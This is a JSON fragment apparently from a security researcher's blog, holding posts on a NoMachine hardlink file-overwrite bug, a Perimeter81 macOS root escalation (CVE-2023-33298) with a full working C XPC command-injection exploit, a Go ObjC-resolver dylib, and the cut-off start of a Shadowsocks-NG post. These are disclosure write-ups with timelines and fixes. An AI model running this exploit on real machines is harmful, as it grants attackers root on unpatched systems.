                    "description": "Using hardlinks to overwrite root owned files",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#analysis\"\u003eAnalysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#exploitation\"\u003eExploitation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003e\u003ca href=\"https://nomachine.com\"\u003eNoMachine\u003c/a\u003e is a free remote desktop solution which features higher speeds than usual competitors. I have identified the possibility to overwrite root-owned files and after\nI have created PoC, I have contacted NoMachine team which was quick to address the vulnerability and to issue the new update.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability was affecting NoMachine free edition and Enterprise Client for macOS and it is fixed in version \u003cem\u003ev8.8.1\u003c/em\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003e\u003ccode\u003eNoMachine\u003c/code\u003e application writes log files to the directory \u003ccode\u003e/Library/Application Support/NoMachine/var/log\u003c/code\u003e. Examining the permissions of this\ndirectory we can see that the directory is owned by the user \u003ccode\u003enx\u003c/code\u003e and that \u003ccode\u003erwx\u003c/code\u003e is set for everyone.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eThe directory contains a couple of \u003ccode\u003e.log\u003c/code\u003e files. Because we are granted \u003ccode\u003erwx\u003c/code\u003e we can simply create a hardlink which points\nto the root-owned file and once the application writes something to the log file, that root-owned file would get overwritten.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch1 id=\"exploitation\"\u003eExploitation\u003c/h1\u003e\n\n\u003cp\u003eTo exploit the vulnerability, we need to simply create the hardlink. As a \u003ccode\u003eroot\u003c/code\u003e user, we will create \u003ccode\u003e/Library/secret\u003c/code\u003e file and\nmake \u003ccode\u003enxserver.log\u003c/code\u003e as a hardlink to that file.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "nomachine_afo.html"
                },
            
                {
                    "title": "CVE-2023-33298 - Perimeter81 Local Privilege Escalation",
                    "description": "Exploiting XPC HelperTool to gain LPE",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#analysis\"\u003eAnalysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#full-exploit\"\u003eFull exploit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#timeline\"\u003eTimeline\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#update\"\u003eUpdate\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eToday we will be analyzing CVE-2023-33298 which is Local Privilege Escalation inside the Perimeter81 macOS application. We will be exploiting XPC service misconfiguration along with the Command Injection vulnerability\nto gain \u003ccode\u003eroot\u003c/code\u003e privileges.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003ePerimeter81 adds an entry to \u003cem\u003eLaunchDaemons\u003c/em\u003e, and we can examine the content of the \u003ccode\u003ecom.perimeter81.osx.HelperTool.plist\u003c/code\u003e located inside \u003ccode\u003e/Library/LaunchDaemons/\u003c/code\u003e directory.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see that the key for \u003ccode\u003eMachServices\u003c/code\u003e is dictionary containing \u003ccode\u003ecom.perimeter81.osx.HelperTool\u003c/code\u003e. This is the name of mach service which is exposed by the\n\u003cem\u003ecom.perimeter81.osx.HelperTool\u003c/em\u003e binary.\u003c/p\u003e\n\n\u003cp\u003eIf we now load \u003ccode\u003e/Library/PrivilegedHelperTools/com.perimeter81.osx.HelperTool\u003c/code\u003e inside the Hopper and search for \u003ccode\u003expc_connection_create_mach_service\u003c/code\u003e we can\nconfirm that the function is called with \u003ccode\u003ecom.perimeter81.osx.HelperTool\u003c/code\u003e as first argument.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom the image, we can also see that it calls \u003ccode\u003expc_connection_set_event_handler\u003c/code\u003e with \u003ccode\u003e\u0026amp;var_40\u003c/code\u003e. We can read \u003ca href=\"https://clang.llvm.org/docs/Block-ABI-Apple.html\"\u003edocumentation\u003c/a\u003e and\nconlude that the structure contains \u003ccode\u003eisa\u003c/code\u003e pointer (which type of block is this), followed by two ints(flags and reserved) and finally \u003ccode\u003evoid (*invoke)(void *, ...);\u003c/code\u003e function pointer\nwhich points to the actualy compiled block body.\u003c/p\u003e\n\n\u003cp\u003eInside the disassembly, we can see that \u003ccode\u003e*(\u0026amp;var_40 + 0x10) = sub_1002169d7;\u003c/code\u003e points to \u003ccode\u003esub_1002169d7\u003c/code\u003e. Let\u0026rsquo;s now examine this function.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eInside the \u003ccode\u003eelse\u003c/code\u003e we can see another call to \u003ccode\u003expc_connection_set_event_handler\u003c/code\u003e with the block that has \u003ccode\u003einvoke\u003c/code\u003e pointer set to \u003ccode\u003esub_100216a98\u003c/code\u003e. Double clicking on this sub shows the following code.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eBased on this function we can conclude the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWe need to send the dictionary\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etype\u003c/code\u003e inside the dictionary needs to be \u003ccode\u003erpc\u003c/code\u003e or \u003ccode\u003ehelper_tool_rpc\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eFunction \u003ccode\u003esub_100216d6c\u003c/code\u003e is called in multiple branches so we will check what that is\u003c/li\u003e\n\u003cli\u003eWe can also see that we have a line \u003ccode\u003er12 = xpc_dictionary_get_string(r13, \u0026quot;rpc\u0026quot;);\u003c/code\u003e followed by the check whether \u003cem\u003er12\u003c/em\u003e is equal to \u003cem\u003estart_connection\u003c/em\u003e so we can conclude that the key \u003cem\u003erpc\u003c/em\u003e will contain some kind of function what to do.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eInspecting the \u003ccode\u003esub_100216d6c\u003c/code\u003e function shows that it calls \u003ccode\u003e-[SDHelperTool handleTargetServiceCommand:withRequest:withReply:]\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eSince this method is a bit bigger, we will show only the beginning and the end of the function which are interesting.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see that it tries to extract the \u003ccode\u003eparameters\u003c/code\u003e and \u003ccode\u003etarget_service\u003c/code\u003e keys. If \u003ccode\u003etarget_service\u003c/code\u003e is NULL, it jumps to \u003ccode\u003eloc_10020a119\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see that it saves \u003ccode\u003e@selector(generalInvoker)\u003c/code\u003e inside the \u003ccode\u003erax\u003c/code\u003e register and then jumps back to \u003ccode\u003eloc_10020a1c0\u003c/code\u003e. \u003ccode\u003eloc_10020a1c0\u003c/code\u003e just calls \u003ccode\u003ehandleXPCServiceCommand:withParameters:withReply\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eIf we search for \u0026ldquo;generalInvoker\u0026rdquo; in Hopper we can see that we have a match for \u003ccode\u003e-[SDHelperTool setup_GeneralInvoker]\u003c/code\u003e which allocates new object of class \u003cem\u003eSDHelperTool_InvokerGeneral\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eSearching for \u003ccode\u003eDHelperTool_InvokerGeneral\u003c/code\u003e reveals a lot of methods. After digging around a bit, I have found \u003ccode\u003einstall_SDP_CA:withReply:\u003c/code\u003e which calls \u003ccode\u003esecurity add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %@\u003c/code\u003e with the value from dictionary under the key \u003ccode\u003eusingCAPath\u003c/code\u003e. This is typical command injection where we can simply append \u003ccode\u003e;\u003c/code\u003e followed by the command we want to execute.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eSo to recap, our exploit should do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ecall \u003ccode\u003expc_connection_create_mach_service\u003c/code\u003e with \u003ccode\u003ecom.perimeter81.osx.HelperTool\u003c/code\u003e as a name\u003c/li\u003e\n\u003cli\u003ecreate a dictionary for \u003cstrong\u003eproperties\u003c/strong\u003e with the key \u003cstrong\u003eusingCAPath\u003c/strong\u003e and value as \u003cstrong\u003e; some command to run as root\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003ecreate another dictionary that will be our message with \u003ccode\u003etype\u003c/code\u003e as \u003ccode\u003ehelper_tool_rpc\u003c/code\u003e, \u003ccode\u003erpc\u003c/code\u003e as \u003ccode\u003einstall_SDP_CA\u003c/code\u003e, and key \u003ccode\u003eparameters\u003c/code\u003e set to the previous dictionary\u003c/li\u003e\n\u003cli\u003esend the message\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"full-exploit\"\u003eFull exploit\u003c/h1\u003e\n\n\u003cp\u003eFull exploit looks like the following:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e#import \u0026lt;Foundation/Foundation.h\u0026gt;\n\n#define NAME \u0026quot;com.perimeter81.osx.HelperTool\u0026quot;\n\nint main(int argc, const char **argv) {\n    if (argc != 2) {\n        printf(\u0026quot;missing cmd to execute\\n\u0026quot;);\n        exit(1);\n    }\n\n    xpc_connection_t conn = xpc_connection_create_mach_service(NAME, NULL, 0);\n    xpc_connection_set_event_handler(conn, ^(xpc_object_t object){\n        NSLog(@\u0026quot;client received event: %s\u0026quot;, xpc_copy_description(object));\n    });\n    xpc_connection_resume(conn);\n\n    const char *c = argv[1];\n\n    char cmd[250];\n    sprintf(cmd, \u0026quot;; %s\u0026quot;, c);\n\n    // create dictionary to hold our parameters\n    // method name and its parameters\n    xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);\n    xpc_dictionary_set_string(params, \u0026quot;usingCAPath\u0026quot;, cmd);\n\n    // create dictionary to send over xpc\n    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);\n    xpc_dictionary_set_string(message, \u0026quot;type\u0026quot;, \u0026quot;helper_tool_rpc\u0026quot;);\n    xpc_dictionary_set_string(message, \u0026quot;rpc\u0026quot;, \u0026quot;install_SDP_CA\u0026quot;);\n    xpc_dictionary_set_value(message, \u0026quot;parameters\u0026quot;, params);\n\n    xpc_connection_send_message_with_reply(conn, message, dispatch_get_main_queue(), ^(xpc_object_t object){\n        NSLog(@\u0026quot;Executed cmd: \\\u0026quot;%s\\\u0026quot;\\n\u0026quot;, c);\n    });\n\n\n    // create run loop so we can get async result for our command, otherwise the exploit would exit after sending the \n    // message\n    dispatch_main();\n\n    return 0;\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch1 id=\"timeline\"\u003eTimeline\u003c/h1\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDate\u003c/th\u003e\n\u003cth\u003eAction\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e17 March 2023\u003c/td\u003e\n\u003ctd\u003eSent report to Perimeter81\u003c/td\u003e\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\u003ctd\u003e21th March 2023\u003c/td\u003e\n\u003ctd\u003eAsked for an update, no reply\u003c/td\u003e\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\u003ctd\u003e10th April 2023\u003c/td\u003e\n\u003ctd\u003eAsked for an update once more, got response that it was wrongly sidetracked\u003c/td\u003e\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\u003ctd\u003e19th April 2023\u003c/td\u003e\n\u003ctd\u003eSent mail to see whether they have investigated it and working on it\u003c/td\u003e\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\u003ctd\u003e10th May 2023\u003c/td\u003e\n\u003ctd\u003eAnother mail and got no response\u003c/td\u003e\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\u003ctd\u003e16th May 2023\u003c/td\u003e\n\u003ctd\u003eContacted VINCE to coordinate disclosure\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003eVINCE tried to contact them multiple times without success, so after more than three months I have decided to disclose the vulnerability.\u003c/p\u003e\n\n\u003ch2 id=\"update\"\u003eUpdate\u003c/h2\u003e\n\n\u003cp\u003ePerimeter81 released fix for this in the version \u003ca href=\"https://support.perimeter81.com/docs/macos-agent-release-notes\"\u003e10.1.2.318\u003c/a\u003e on the 25th of July.\u003c/p\u003e\n",
                    "name": "cve_2023_33298.html"
                },
            
                {
                    "title": "GObjCResolv",
                    "description": "Creating ObjC resolver in Golang",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#creating-resolver\"\u003eCreating Resolver\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#creating-tcp-server\"\u003eCreating TCP server\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#building-and-using\"\u003eBuilding and using\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eWhile I was reading and analyzing some of frida code, I explored the idea of objc resolver that is available inside of it.\u003c/p\u003e\n\n\u003cp\u003eThe idea of resolver is simple:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eload objc dynamic library\u003c/li\u003e\n\u003cli\u003eenumerate classes\u003c/li\u003e\n\u003cli\u003efor each class enumerate instance and class methods\u003c/li\u003e\n\u003cli\u003eadd something more on top of it (like matching based on wildcard)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eOur \u003ccode\u003egobjcresolver.dylib\u003c/code\u003e will look something like:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eenumerate classes\u003c/li\u003e\n\u003cli\u003epopulate their instance and class methods\u003c/li\u003e\n\u003cli\u003eopen some port to allow connection\u003c/li\u003e\n\u003cli\u003eadd custom protocol interaction between server(\u003ccode\u003egobjcresolver.dylib\u003c/code\u003e) and client(ourselves).\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis will be implemented using Go mixed with C code and built as dynamic library ready to be loaded inside the iOS applications.\u003c/p\u003e\n\n\u003ch2 id=\"creating-resolver\"\u003eCreating Resolver\u003c/h2\u003e\n\n\u003cp\u003eInteraction with ObjC is available to us using \u003ccode\u003eobjc/runtime.h\u003c/code\u003e header file.\nDynamic library that actually exposes ObjC runtime to us\nis \u003ccode\u003e/usr/lib/libobjc.A.dylib\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eDuring application/program runtime, we can load specific library using \u003ccode\u003edlopen\u003c/code\u003e function inside of \u003ccode\u003edlfcn.h\u003c/code\u003e header file. Once we have obtained the handle\n we can then use \u003ccode\u003edlsym\u003c/code\u003e function to get function pointers for the symbol.\u003c/p\u003e\n\n\u003cp\u003eIn \u003ccode\u003eC\u003c/code\u003e code this looks like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-C\"\u003e/*\n    If we want to get a handle of lets say function:\n    void some_function(char * something) we can use the \n    code that looks like the one below.\n*/\n// get handle of the library\nvoid * handle = dlopen(\u0026quot;/library/path\u0026quot;, FLAGS); \n// get function pointer of the symbol\nvoid (*function)(*char) = dlsym(handle, \u0026quot;some_function\u0026quot;);\n// call function\nfunction(\u0026quot;some argument\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow, since we have the way to get function pointers, the functions that we need to get are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eobjc_getClassList\u003c/code\u003e - to get a list of registered ObjC classes\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eclass_getName\u003c/code\u003e - to get a name of the class\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eclass_copyMethodList\u003c/code\u003e - to get a list of instance methods for specific class\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eobject_getClass\u003c/code\u003e - to get a class methods for specific class\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emethod_getName\u003c/code\u003e - to get a name of the method\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esel_getName\u003c/code\u003e - to convert \u003ccode\u003eSEL\u003c/code\u003e to \u003ccode\u003echar*\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis whole C code will look like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-C\"\u003e#include \u0026lt;dlfcn.h\u0026gt;\n#include \u0026lt;objc/runtime.h\u0026gt;\n#include \u0026lt;stdio.h\u0026gt;\n\nstatic int (*getClassList)(void*,int) = NULL;\nstatic char* (*getClassName)(Class) = NULL;\nstatic Method* (*copyMethodList)(Class,int*) = NULL;\nstatic SEL (*getSelector)(Method) = NULL;\nstatic char* (*getSelName)(SEL) = NULL;\nstatic Class (*objectGetClass)(void*) = NULL;\n\nstatic void * open_handle(void)\n{\n\tvoid * handle = dlopen(\u0026quot;/usr/lib/libobjc.A.dylib\u0026quot;,\n\t\tRTLD_LAZY | RTLD_GLOBAL | RTLD_NOLOAD);\n\tgetClassList = dlsym(handle, \u0026quot;objc_getClassList\u0026quot;);\n\tgetClassName = dlsym(handle, \u0026quot;class_getName\u0026quot;);\n\tcopyMethodList = dlsym(handle, \u0026quot;class_copyMethodList\u0026quot;);\n\tgetSelector = dlsym(handle, \u0026quot;method_getName\u0026quot;);\n\tgetSelName = dlsym(handle, \u0026quot;sel_getName\u0026quot;);\n\tobjectGetClass = dlsym(handle, \u0026quot;object_getClass\u0026quot;);\n\n\treturn handle;\n}\n\nint do_getClassList(Class * ptr, int count)\n{\n\treturn getClassList(ptr, count);\n}\n\nchar * do_getClassName(Class klass)\n{\n\treturn getClassName(klass);\n}\n\nMethod * do_copyMethodList(Class klass, int * count)\n{\n\tMethod * methods = (Method*)malloc(sizeof(Method)*(*count));\n\tmethods = copyMethodList(klass, count);\n\treturn methods;\n}\n\nchar * do_getSelName(Method method) {\n\treturn getSelName(getSelector(method));\n}\n\nClass do_objectGetClass(void * klass)\n{\n\treturn objectGetClass(klass);\n}\n\nstatic Class * alloc_classes(int count)\n{\n\tClass * classes = (Class*)malloc(sizeof(Class)*count);\n\treturn classes;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eDue to the limitations of CGO, we cannot directly call function pointers and that is the reason we are having wrapper functions that\nactually call our C function pointers.\u003c/p\u003e\n\n\u003cp\u003eOur C code is finished, now we will create Go structs that represents \u003ccode\u003eClass\u003c/code\u003e, \u003ccode\u003eMethod\u003c/code\u003e and a \u003ccode\u003eResolver\u003c/code\u003e which will be our entrypoint.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003etype Method struct {\n\thandle   C.Method\n\tselector string\n}\n\ntype Class struct {\n\tname            string\n\thandle          C.Class\n\tinstanceMethods []Method\n\tclassMethods    []Method\n}\n\ntype Resolver struct {\n\tclassCount int\n\thandle     unsafe.Pointer\n\tclasses    []Class\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe will create \u003ccode\u003enewResolver()\u003c/code\u003e function which will call \u003ccode\u003eopen_handle()\u003c/code\u003e and return \u003ccode\u003e*Resolver\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003efunc newResolver() *Resolver {\n\tres := \u0026amp;Resolver{}\n\tres.handle = C.open_handle()\n\treturn res\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThe main Resolver method, \u003ccode\u003eenumerateClasses()\u003c/code\u003e will do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eget count of all classes\u003c/li\u003e\n\u003cli\u003eallocate \u003ccode\u003earray\u003c/code\u003e of \u003ccode\u003eClass\u003c/code\u003e with \u003ccode\u003ecount\u003c/code\u003e elements\u003c/li\u003e\n\u003cli\u003epopulate this array using \u003ccode\u003edo_getClassList(array, count)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ecreate Go slice that will hold previous array\u003c/li\u003e\n\u003cli\u003efor each class in the slice\n\n\u003cul\u003e\n\u003cli\u003eget name using \u003ccode\u003edo_getClassName(class)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eget instance methods using \u003ccode\u003edo_copyMethodList(class, \u0026amp;count)\u003c/code\u003e and get each name\u003c/li\u003e\n\u003cli\u003eappend these methods to the \u003ccode\u003einstanceMethods\u003c/code\u003e slice for each \u003ccode\u003eClass\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eget class methods using \u003ccode\u003edo_copyMethodList(do_objectGetClass(class), \u0026amp;count)\u003c/code\u003e and get each name\u003c/li\u003e\n\u003cli\u003eappend these methods to the \u003ccode\u003eclassMethods\u003c/code\u003e slice for each \u003ccode\u003eClass\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eappend this \u003ccode\u003eClass\u003c/code\u003e to the \u003ccode\u003eclasses\u003c/code\u003e slice inside the Resolver\u003c/li\u003e\n\u003c/ul\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe full code for this method is:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003efunc (r *Resolver) enumerateClasses() {\n\tr.classCount = int(C.do_getClassList(nil, 0))\n\n\tclasses := C.alloc_classes(C.int(r.classCount))\n\tC.do_getClassList(classes, C.int(r.classCount))\n\n\tvar cls []C.Class\n\n\thdr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;cls))\n\thdr.Cap = r.classCount\n\thdr.Len = r.classCount\n\thdr.Data = uintptr(unsafe.Pointer(classes))\n\n\tfor _, class := range cls {\n\t\tname := C.GoString(C.do_getClassName(class))\n\t\tklass := Class{\n\t\t\tname:   name,\n\t\t\thandle: class,\n\t\t}\n\t\tvar count C.int\n\t\tinstanceMethods := C.do_copyMethodList(class, \u0026amp;count)\n\n\t\tvar methods []C.Method\n\n\t\tmethodsHdr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;methods))\n\t\tmethodsHdr.Cap = int(count)\n\t\tmethodsHdr.Len = int(count)\n\t\tmethodsHdr.Data = uintptr(unsafe.Pointer(instanceMethods))\n\n\t\tfor _, method := range methods {\n\t\t\tklass.instanceMethods = append(klass.instanceMethods, Method{\n\t\t\t\thandle:   method,\n\t\t\t\tselector: C.GoString(C.do_getSelName(method)),\n\t\t\t})\n\t\t}\n\n\t\tclassMethods := C.do_copyMethodList(C.do_objectGetClass(unsafe.Pointer(class)), \u0026amp;count)\n\n\t\tvar clsMethods []C.Method\n\n\t\tcMethodsHdr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;clsMethods))\n\t\tcMethodsHdr.Cap = int(count)\n\t\tcMethodsHdr.Len = int(count)\n\t\tcMethodsHdr.Data = uintptr(unsafe.Pointer(classMethods))\n\n\t\tfor _, method := range clsMethods {\n\t\t\tklass.classMethods = append(klass.classMethods, Method{\n\t\t\t\thandle:   method,\n\t\t\t\tselector: C.GoString(C.do_getSelName(method)),\n\t\t\t})\n\t\t}\n\n\t\tr.classes = append(r.classes, klass)\n\t}\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch1 id=\"creating-tcp-server\"\u003eCreating TCP server\u003c/h1\u003e\n\n\u003cp\u003eThe next step is creating the code that will setup TCP listener, that waits for the connection and once the connection has been established,\nit allows the usage of Resolver.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-go\"\u003e//export run\nfunc run() {\n\tres := newResolver()\n\tres.enumerateClasses()\n\n\tlisten, err := net.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;:6666\u0026quot;)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tfmt.Println(\u0026quot;gobjcresolver: Listening on port 6666\u0026quot;)\n\n\tgo func() {\n\t\tconn, err := listen.Accept()\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tfmt.Printf(\u0026quot;gobjcresolver: Connection from %s\\n\u0026quot;, conn.RemoteAddr().String())\n\t\tgo handle(conn, res)\n\t}()\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003ccode\u003e//export run\u003c/code\u003e means that we will expose this function to the C code, the reason we are doing this is because inside of our \u003ccode\u003econstructor\u003c/code\u003e we will call this method.\u003c/p\u003e\n\n\u003cp\u003eTo access the exported Go function, we use \u003ccode\u003eextern\u003c/code\u003e C keyword followed by the function definition.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-C\"\u003e\nextern void run(void);\n\n__attribute__((constructor))\nstatic void ctor(void)\n{\n\trun();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThe rest of the code are just some methods that enumerate classes and methods, full code can be viewed at \u003ca href=\"https://github.com/nsecho/gobjcresolver\"\u003egobjcresolver\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"building-and-using\"\u003eBuilding and using\u003c/h1\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-Makefile\"\u003eCGO_ENABLED = 1\nGOOS = ios\nGOARCH = arm64\nOUTPUT = gobjcresolv.dylib\nCC = $(shell xcrun --sdk iphoneos --find clang) \\\n-arch arm64 \\\n-isysroot $(shell xcrun --sdk iphoneos --show-sdk-path)\nall:\n\t@CGO_ENABLED=$(CGO_ENABLED) GOOS=$(GOOS) \\\n\t\tGOARCH=$(GOARCH) CC=\u0026quot;$(CC)\u0026quot; \\\n\t\tgo build -buildmode=c-archive -o gobjcresolv.a .\n\t@xcrun --sdk iphoneos clang -arch arm64 \\\n\t\t-shared -all_load -o $(OUTPUT) gobjcresolv.a \\\n\t\t-framework CoreFoundation\n\t@rm gobjcresolv.h gobjcresolv.a\n\t@echo \u0026quot;[*] Created dylib $(OUTPUT)\u0026quot; \n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eOnce \u003ccode\u003egobjcresolv.dylib\u003c/code\u003e is created, we can add it to the application using the method described in\n\u003ca href=\"frida_patching.html\"\u003eFridaGadget.dylib on nonjailbroken iPhone\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "gobjcresolv.html"
                },
            
                {
                    "title": "CVE-2023-27574 - Shadowsocks-NG code execution",
                    "description": "Exploiting get-task-allow for code execution",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#analysis\"\u003eAnalysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mach-vm-api\"\u003eMach VM API\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eRecently, I started playing a bit with different methods of code injection inside the MacOS applications.\nThe version of  \u003ca href=\"https://github.com/shadowsocks/ShadowsocksX-NG/releases/tag/v1.10.1\"\u003eShadowsocksX-NG\u003c/a\u003e prior to \u003ccode\u003ev1.10.1\u003c/code\u003e has \u003ccode\u003ecom.apple.security.get-task-allow\u003c/code\u003e entitlement.\u003c/p\u003e\n\n\u003cp\u003eThis entitlement allows other processes to obtain the applications task. Obtaining the task means you can do with the process everything you want(code execution, memory read/write etc).\u003c/p\u003e\n\n\u003cp\u003eAt the end of this post, we will be exploiting this to write \u003ccode\u003epwned\u003c/code\u003e text to the STDOUT of the application. Nothing fancy about it, just demonstrates the  usage of mach API and a bit of shellcoding for arm64.\u003c/p\u003e\n\n\u003cp\u003eWe will utilize mach vm API with the \u003ccode\u003ethread_create_running\u003c/code\u003e to execute our shellcode on macOS Ventura running on M1 using arm64 architecture.\u003c/p\u003e\n\n\u003ch1 